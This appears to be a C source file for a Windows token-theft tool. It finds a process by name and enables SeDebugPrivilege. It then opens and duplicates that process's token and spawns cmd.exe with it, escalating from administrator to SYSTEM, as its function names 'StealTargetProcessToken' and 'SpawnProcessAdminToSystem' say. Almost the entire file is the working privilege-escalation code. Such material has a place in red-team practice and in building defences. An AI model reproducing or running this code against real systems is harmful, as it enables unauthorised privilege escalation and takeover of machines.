#include "DupeToken.h"

BOOL GetRemoteId
(
	_In_ LPCWSTR ProcName,
	_Out_ DWORD* PID
)

{

	BOOL			State = TRUE;
	BOOL			found = FALSE;
	HANDLE			hSnap = NULL;
	PROCESSENTRY32W pe32 = { 0 };

	pe32.dwSize = sizeof(pe32);

	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap == NULL)
	{
		PRINT_ERROR("CreateToolhelp32Snapshot");
		State = FALSE; goto _END_FUNC;
	}

	INFO("[0x%p] Acquired Handle to hSnap", hSnap);

	if (Process32FirstW(hSnap, &pe32))
	{
		do
		{
			if (_wcsicmp(pe32.szExeFile, ProcName) == 0)
			{
				*PID = pe32.th32ProcessID;

				found = TRUE;
				break;
			}

		} while (Process32NextW(hSnap, &pe32));
	}

_END_FUNC:

	if (hSnap)
		CloseHandle(hSnap);

	return found;

	return State;

}

HANDLE GetCurrentUserToken()
{

	HANDLE Token = INVALID_HANDLE_VALUE;
	
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &Token))
	{
		PRINT_ERROR("OpenProcessToken");
		return FALSE;
	}

	return Token;

}

BOOLEAN StealTargetProcessToken
(
	_In_ DWORD ProcessId,
	_Out_ HANDLE* DupedTokenHandle
)
{

	HANDLE ProcessHandle = NULL;
	HANDLE CurrentUserTokenHandle = NULL;
	HANDLE NewToken = NULL;
	TOKEN_PRIVILEGES TokenPrivs = { 0 };
	LUID Luid = { 0 };

	CurrentUserTokenHandle = GetCurrentUserToken();

	if (!LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &Luid))
	{
		PRINT_ERROR("LookupPrivilegeValueW");
		return FALSE;
	}

	TokenPrivs.PrivilegeCount = 1;
	TokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	TokenPrivs.Privileges[0].Luid = Luid;

	if (!AdjustTokenPrivileges(CurrentUserTokenHandle, FALSE, &TokenPrivs, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
	{
		PRINT_ERROR("AdjustTokenPrivileges");
		return FALSE;
	}

	if (!(ProcessHandle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, ProcessId)))
	{
		PRINT_ERROR("OpenProcess");
		return FALSE;
	}

	if (!OpenProcessToken(ProcessHandle, (TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY), &NewToken))
	{
		PRINT_ERROR("OpenProcessToken");
		return FALSE;
	}

	*DupedTokenHandle = NewToken;

	CloseHandle(ProcessHandle);
	CloseHandle(CurrentUserTokenHandle);

	return TRUE;

}

BOOLEAN SpawnProcessAdminToSystem
(
	_In_ HANDLE DupedTokenHandle
)
{

	HANDLE NewTokenHandle = NULL;

	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFOW si = { 0 };

	RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	RtlSecureZeroMemory(&si, sizeof(STARTUPINFOW));
	si.cb = sizeof(STARTUPINFOW);

	if (!DuplicateTokenEx(DupedTokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &NewTokenHandle))
	{
		PRINT_ERROR("DuplicateTokenEx");
		return FALSE;
	}

	if (!CreateProcessWithTokenW(NewTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &si, &pi))
	{
		PRINT_ERROR("CreateProcessWithTokenW");
		return FALSE;
	}

	WaitForSingleObject(pi.hProcess, INFINITE);

	CloseHandle(DupedTokenHandle);
	CloseHandle(NewTokenHandle);

	return TRUE;

}